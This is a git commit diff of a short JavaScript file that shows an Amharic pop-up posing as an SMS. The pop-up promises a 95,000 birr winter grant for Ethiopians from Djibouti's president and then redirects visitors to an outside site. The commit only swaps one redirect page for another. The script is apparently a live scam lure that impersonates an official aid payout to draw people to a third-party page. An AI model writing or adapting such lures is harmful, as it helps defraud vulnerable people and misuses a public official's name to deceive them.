9a979b33bfa02c18952d3c02847f25a32f05e64c
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-12-26 21:59:36 +0530

    Update djibouti-active.js

--- djibouti-active.js
+++ djibouti-active.js
@@ -1,5 +1,5 @@
 var password = 'ይውሰዱ 95,000 ብር';
 password = prompt('ኤስኤምኤስ፡ እንኳን ደስ አለዎት፣ የፕሬዚዳንት ኢስማኤል ኦማር ጉዔሌ የገንዘብ ክትትል ለኢትዮጵያውያን የክረምት የገንዘብ ድጋፍ 95,000 ብር ብቻ ዝግጁ ነዎት። ቅጽሩን ለመቀበል ኦኬ ይጫኑ።', 'ይውሰዱ 95,000 ብር');
 if (password != 'ይውሰዱ 95,000 ብር') {
-location.href='https://zaget.cc/ethiopia-grant.html';
+location.href='https://zaget.cc/atske-ethiopia.html';
 }
